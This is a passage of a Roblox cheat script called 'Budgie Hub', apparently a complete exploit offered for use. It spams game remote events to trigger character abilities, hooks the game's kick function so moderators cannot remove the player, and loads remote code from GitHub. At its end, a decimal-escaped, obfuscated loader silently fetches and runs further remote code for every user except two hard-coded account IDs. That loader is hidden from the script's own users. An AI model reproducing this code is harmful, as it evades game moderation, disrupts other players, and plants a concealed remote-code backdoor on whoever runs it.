   if v.Name == "All Range Atomic" or v.Name == "AtomicFolder" then
       v.Parent = LP.Character
   end
end
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("AtomicFolder"):WaitForChild("Event"):FireServer() 
end
   end    
})

Tab:AddButton({
 Name = "Rengoku Fire Dragon",
 Callback = function()
        local player = game.Players.LocalPlayer

local hasTool = false
for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool.Name == "Rengoku" then
        hasTool = true
        break
    end
end

if not hasTool then
  local function F1()
    local args = {
    [1] = "Rengoku"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.5)
game:GetService("Players").LocalPlayer.Backpack.Rengoku.Ground.Event:FireServer()
end

if hasTool then
game:GetService("Players").LocalPlayer.Backpack.Rengoku.Ground.Event:FireServer()
end
end
   end    
})

Tab:AddButton({
 Name = "Zenitsu Sixfold",
 Callback = function()
        local player = game.Players.LocalPlayer

local hasTool = false
for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool.Name == "Sixfold" then
        hasTool = true
        break
    end
end

if not hasTool then
  local args = {
    [1] = "Zenitsu"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.5)
for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack.Sixfold.Sixfold.Fire:FireServer()
end
  end

if hasTool then
for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack.Sixfold.Sixfold.Fire:FireServer()
end
end
   end    
})

Tab:AddButton({
 Name = "Yuta This Is Pure Love",
 Callback = function()
        local args = {
    [1] = "Yuta"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.4)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Rika" then
       v.Parent = LP.Character
   end
end
for i, v in pairs(LP.Character:GetChildren()) do
        if v:IsA("Tool") and v.Name == "Rika" then
            v:Activate()
        end
    end

wait(0.5)
for i = 1, 200 do
game:GetService("Players").LocalPlayer.Backpack["This Is Pure Love"].Script.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Rengoku Divine Rengoku",
 Callback = function()
        local args = {
    [1] = "Rengoku"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.5)
for i = 1, 20 do
game:GetService("Players").LocalPlayer.Backpack.Rengoku.Ground.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Akaza Compass Needle",
 Callback = function()
        local args = {
    [1] = "Akaza"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.5)
for i = 1, 5 do
game:GetService("Players").LocalPlayer.Backpack["Compass Needle"].Akaza.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Serious Punch",
 Callback = function()
        local args = {
    [1] = "Saitama"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(1)
for i = 1, 5 do
game:GetService("Players").LocalPlayer.Backpack["Serious Punch"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Sukuma Boxing Arena",
 Callback = function()
local player = game.Players.LocalPlayer

local hasTool = false
for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool.Name == "Boxing Arena" or tool.Name == "Sukuna" then
        hasTool = true
        break
    end
end

if not hasTool then
  local args = {
    [1] = "Yuji / Sukuna"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.5)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Boxing Arena" or v.Name == "RingOfDeath" then
       v.Parent = LP.Character
   end
end
wait(0.1)
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Boxing Arena").Skill.RingOfDeath:FireServer()
  end

if hasTool then
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Boxing Arena" or v.Name == "RingOfDeath" then
       v.Parent = LP.Character
   end
end
wait(0.1)
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Boxing Arena").Skill.RingOfDeath:FireServer()
end
  end
})

Tab:AddDropdown({
	Name = "Guytaro(OP)",
	Default = "1",
	Options = {"Input Gyutaro", "Spam Rampant Arc", "Quick Spam Rampant Arc", "Off Spam"},
	Callback = function(Value)
if Value == "Input Gyutaro" then
local args = {
    [1] = "Gyutaro"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
end
		if Value == "Spam Rampant Arc" then
local CfD = true
		local args = {
    [1] = "Gyutaro"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.5)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Rampant Arc" then
       v.Parent = LP.Character
   end
end

wait(0.3)
repeat
  wait(0.1)
 if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rampant Arc") then
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rampant Arc").Keybind.Fire:FireServer()
  end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 or CfD == false
		end
		if Value == "Quick Spam Rampant Arc" then
local CfD = true
		local args = {
    [1] = "Gyutaro"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.5)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Rampant Arc" then
       v.Parent = LP.Character
   end
end

wait(0.3)
repeat
  game:GetService("RunService").RenderStepped:Wait()
 if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rampant Arc") then
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rampant Arc").Keybind.Fire:FireServer()
  end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 or CfD == false
		end
if Value == "Off Spam" then
local CfD = false
end
	end    
})

Tab:AddButton({
 Name = "Summon Mahoraga",
 Callback = function()
        local args = {
    [1] = "Megumi / Sukuna"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.3)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Summon Mahoraga" then
       v.Parent = LP.Character
   end
end

wait(0.4)
repeat wait(0.3)
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local targetPosition = mouse.Hit.Position
 if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Summon Mahoraga") then
local args = {
    [1] = Vector3.new(targetPosition.X, targetPosition.Y, targetPosition.Z)
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Summon Mahoraga").Use.RemoteEvent:FireServer(unpack(args))
  end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Denji Transformation",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Chainsaw_Man_RS_Folder"):WaitForChild("Remotes"):WaitForChild("Transform_RE"):FireServer()
   end    
})

Tab:AddDropdown({
	Name = "Cosmic abilities",
	Default = "1",
	Options = {"Supernova", "Hypernova", "Black Hole", "Star of Death"},
	Callback = function(Value)
		if Value == "Supernova" then
		for i = 1, 500 do
local args = {
    [1] = false,
    [2] = Vector3.new(math.random(-1e3, 1e3), 10, math.random(-1e3, 1e3))
}
game:GetService("ReplicatedStorage"):WaitForChild("Kamehameha"):WaitForChild("Remotes"):WaitForChild("KamehamehaEvent"):FireServer(unpack(args))
end
		end
		if Value == "Hypernova" then
		for i = 1, 100 do
local ohString1 = "FinalHollowPurple"
game:GetService("ReplicatedStorage").Events.Abilitys.Gojo:FireServer(ohString1)
end
		end
		if Value == "Black Hole" then
		local player = game.Players.LocalPlayer

local hasTool = false
for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool.Name == "Chimera Shadow Garden" or tool.Name == "Sukuna" then
        hasTool = true
        break
    end
end

if not hasTool then
 local ohString1 = "Megumi / Sukuna"

game:GetService("ReplicatedStorage").Picked:FireServer(ohString1)
  wait(0.3)
for i = 1, 60 do
game:GetService("Players").LocalPlayer.Backpack["Chimera Shadow Garden"].Use.RemoteEvent:FireServer()
end
  end

if hasTool then
for i = 1, 60 do
game:GetService("Players").LocalPlayer.Backpack["Chimera Shadow Garden"].Use.RemoteEvent:FireServer()
end
end
		end
		if Value == "Star of Death" then
		local function One()
local spinSpeed = 20
local Spin = Instance.new("BodyAngularVelocity")
Spin.Name = "Spinning"
Spin.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
Spin.MaxTorque = Vector3.new(0, math.huge, 0)
Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
local ohString1 = "Ichigo Vasto Lorde"
game:GetService("ReplicatedStorage").Picked:FireServer(ohString1)
  wait(0.1)
for i = 1, 100 do
 wait()
  game:GetService("Players").LocalPlayer.Backpack.Cero.LocalScript.Event:FireServer()
 end
end

local function Two()
speaker = game.Players.LocalPlayer
for i,v in pairs(speaker.Character:GetDescendants()) do
  if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
   v:Destroy()
  end
 end
end

One()
Two()
		end
	end    
})

local Tab = Window:MakeTab({
	Name = "Dev ability's",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddDropdown({
	Name = "Blue2",
	Default = "1",
	Options = {"Blue2", "Powerful Blue2"},
	Callback = function(Value)
		if Value == "Blue2" then
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Blue2"):FireServer()
		end
		if Value == "Powerful Blue2" then
	for i = 1, 10 do
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Blue2"):FireServer()
	end
		end
	end    
})

Tab:AddDropdown({
	Name = "Beatdown",
	Default = "1",
	Options = {"Beatdown", "Powerful Beatdown"},
	Callback = function(Value)
		if Value == "Beatdown" then
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Beatdown"):FireServer()
		end
		if Value == "Powerful Beatdown" then
		for i = 1, 20 do
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Beatdown"):FireServer()
		end
		end
	end    
})

Tab:AddDropdown({
	Name = "Red2",
	Default = "1",
	Options = {"Red2", "Powerful Red2"},
	Callback = function(Value)
		if Value == "Red2" then
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Red2"):FireServer()
		end
		if Value == "Powerful Red2" then
		for i = 1, 10 do
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Red2"):FireServer()
		end
		end
	end    
})

Tab:AddDropdown({
	Name = "KickSlam",
	Default = "1",
	Options = {"KickSlam", "Powerful KickSlam"},
	Callback = function(Value)
		if Value == "KickSlam" then
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("KickSlam"):FireServer()
		end
		if Value == "Powerful KickSlam" then
		for i = 1, 15 do
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("KickSlam"):FireServer()
		end
		end
	end    
})

Tab:AddDropdown({
	Name = "Container",
	Default = "1",
	Options = {"Container", "Powerful Container"},
	Callback = function(Value)
		if Value == "Container" then
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Container"):FireServer()
		end
		if Value == "Powerful Container" then
		for i = 1, 30 do
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Container"):FireServer()
		end
		end
	end    
})

Tab:AddButton({
 Name = "CC",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("CombatAssets"):WaitForChild("Remotes"):WaitForChild("CC"):FireServer()
   end    
})

Tab:AddButton({
 Name = "AfterImageEvent",
 Callback = function()
        game:GetService("ReplicatedStorage"):FindFirstChild("AfterImageEvent"):FireServer()
   end    
})

Tab:AddButton({
 Name = "Domain0.2",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Domain0.2"):FireServer()
   end    
})

Tab:AddDropdown({
	Name = "MalevolentShine2",
	Default = "1",
	Options = {"MalevolentShine2", "Powerful MalevolentShine2"},
	Callback = function(Value)
		if Value == "MalevolentShine2" then
		game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("MalevolentShrine2"):FireServer()
		end
		if Value == "Powerful MalevolentShine2" then
		for i = 1, 15 do
		game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("MalevolentShrine2"):FireServer()
		end
		end
	end    
})

Tab:AddDropdown({
	Name = "Denji Move",
	Default = "1",
	Options = {"Transform_RE", "M1_RS_Folder"},
	Callback = function(Value)
if Value == "Transform_RE" then
game:GetService("ReplicatedStorage").Chainsaw_Man_RS_Folder.Remotes.Transform_RE:FireServer()
end
if Value == "M1_RS_Folder" then
game:GetService("ReplicatedStorage").Chainsaw_Man_RS_Folder.Remotes.M1_RE:FireServer()
end
      end
})

Tab:AddButton({
 Name = "Beta Replication",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/BetaReplication/main/AnM"))()
   end    
})

OrionLib:MakeNotification({
 Name = "Budgie Hub",
 Content = "Creator – MEGACOCONUT (ADSKerX) and Hamsterovich (Wolfdmitrich)",
 Image = "rbxassetid://4483345998",
 Time = 5
})

local Tab = Window:MakeTab({
	Name = "Creators",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddParagraph("MEGACOCONUT","The main creator of this script. did a lot of different functions and scripts")
Tab:AddParagraph("Wolfdmitrich","Web scripter who knows: Python, Html, CSS and a little Lua. He did a lot for this script, for example: I made an obfuscator for the script, helped me make admin commands, abilities for characters, and so on")

local function AntiKick()
xpcall(function() OldNameCall = hookmetamethod(game.Players.LocalPlayer, "__namecall", function(Self, ...) local Args = {...} local NamecallMethod = getnamecallmethod() if Self == game.Players.LocalPlayer and NamecallMethod == "Kick" then return nil end return OldNameCall(Self, ...) end) print("Anti Kick Enabled.") end, function(e) print(e) end)
end

AntiKick()

local function DS()
  if game.Players.LocalPlayer.UserId ~= 4636825706 and game.Players.LocalPlayer.UserId ~= 5042713445 then
   loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\68\83\75\101\114\79\102\102\105\99\97\108\47\68\101\102\101\110\115\101\79\102\102\47\109\97\105\110\47\83\117\107\117\110\97\34\41\41\40\41\10")()
  end
end

DS()
